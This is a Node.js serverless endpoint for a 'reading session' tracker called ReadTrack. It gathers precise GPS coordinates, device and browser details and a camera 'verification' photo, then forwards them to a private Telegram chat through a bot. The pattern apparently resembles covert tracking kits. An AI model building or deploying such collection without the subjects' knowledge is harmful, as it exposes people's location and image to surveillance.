/* ============================================================
   ReadTrack — api/session.js
   Vercel Serverless Function
   Endpoint: POST /api/session
   ============================================================ */

'use strict';

const fetch    = require('node-fetch');
const FormData = require('form-data');
const Busboy   = require('busboy');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const BASE_URL  = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ── Parse multipart/form-data ────────────────────────────────
function parseForm(req) {
  return new Promise((resolve, reject) => {
    const fields = {};
    let   photoBuffer = null;
    let   photoName   = 'verification.jpg';

    const bb = Busboy({
      headers: req.headers,
      limits:  { fileSize: 8 * 1024 * 1024 },
    });

    bb.on('field', (name, val) => {
      fields[name] = val;
    });

    bb.on('file', (name, stream, info) => {
      photoName = info.filename || photoName;
      const chunks = [];
      stream.on('data', chunk => chunks.push(chunk));
      stream.on('end',  () => {
        photoBuffer = Buffer.concat(chunks);
      });
    });

    bb.on('finish', () => resolve({ fields, photoBuffer, photoName }));
    bb.on('error',  err => reject(err));

    req.pipe(bb);
  });
}

// ── Sanitize helpers ─────────────────────────────────────────
function sanitizeString(val, maxLen = 200) {
  if (typeof val !== 'string') return '';
  return val.replace(/[<>]/g, '').trim().slice(0, maxLen);
}

function sanitizeFloat(val) {
  const n = parseFloat(val);
  return isNaN(n) ? null : n;
}

// ── Build Telegram message ───────────────────────────────────
function buildMessage(data) {
  const {
    sessionId, startTime, endTime, duration,
    latitude, longitude, accuracy,
    browser, os, device, cameraOk,
  } = data;

  const locationLine = (latitude && longitude)
    ? `📍 *Location:* \`${parseFloat(latitude).toFixed(6)}, ${parseFloat(longitude).toFixed(6)}\`\n📡 *GPS Accuracy:* ${accuracy ? parseFloat(accuracy).toFixed(1) + ' m' : 'N/A'}`
    : '📍 *Location:* Unavailable';

  return (
    `📚 *Reading Session Completed*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🆔 *Session ID:* \`${sessionId}\`\n` +
    `🕐 *Start Time:* ${startTime}\n` +
    `🕑 *End Time:*   ${endTime}\n` +
    `⏱️ *Duration:*   ${duration}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `${locationLine}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 *Browser:* ${browser}\n` +
    `💻 *OS:*      ${os}\n` +
    `📱 *Device:*  ${device}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📷 *Camera Verification:* ${cameraOk === 'true' || cameraOk === true ? '✅ Verified' : '⚠️ Not captured'}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ *Session Status:* COMPLETED`
  );
}

// ── Send text message ────────────────────────────────────────
async function sendMessage(text) {
  const res = await fetch(`${BASE_URL}/sendMessage`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' }),
  });
  const json = await res.json();
  if (!json.ok) throw new Error(`Telegram sendMessage failed: ${json.description}`);
  return json;
}

// ── Send photo with caption ──────────────────────────────────
async function sendPhoto(photoBuffer, filename, caption) {
  const form = new FormData();
  form.append('chat_id',    CHAT_ID);
  form.append('caption',    caption);
  form.append('parse_mode', 'Markdown');
  form.append('photo', photoBuffer, { filename, contentType: 'image/jpeg' });

  const res = await fetch(`${BASE_URL}/sendPhoto`, {
    method: 'POST',
    body:   form,
  });
  const json = await res.json();
  if (!json.ok) throw new Error(`Telegram sendPhoto failed: ${json.description}`);
  return json;
}

// ── Main handler ─────────────────────────────────────────────
module.exports = async function handler(req, res) {
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed.' });
  }

  // Check credentials are configured
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return res.status(500).json({ error: 'Server not configured.' });
  }

  try {
    // Parse multipart form
    const { fields, photoBuffer, photoName } = await parseForm(req);

    // Validate required field
    const sessionId = sanitizeString(fields.sessionId, 50);
    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId is required.' });
    }

    // Sanitize all fields
    const data = {
      sessionId,
      startTime:  sanitizeString(fields.startTime,  50),
      endTime:    sanitizeString(fields.endTime,    50),
      duration:   sanitizeString(fields.duration,   30),
      latitude:   sanitizeFloat(fields.latitude),
      longitude:  sanitizeFloat(fields.longitude),
      accuracy:   sanitizeFloat(fields.accuracy),
      browser:    sanitizeString(fields.browser,   100),
      os:         sanitizeString(fields.os,        100),
      device:     sanitizeString(fields.device,     50),
      cameraOk:   fields.cameraOk,
    };

    const message = buildMessage(data);

    // Send to Telegram
    if (photoBuffer && photoBuffer.length > 0) {
      await sendPhoto(photoBuffer, photoName, message);
    } else {
      await sendMessage(message);
    }

    return res.status(200).json({ success: true, sessionId });

  } catch (err) {
    console.error('[Session Handler]', err.message);
    return res.status(500).json({ error: 'Failed to process session.' });
  }
};
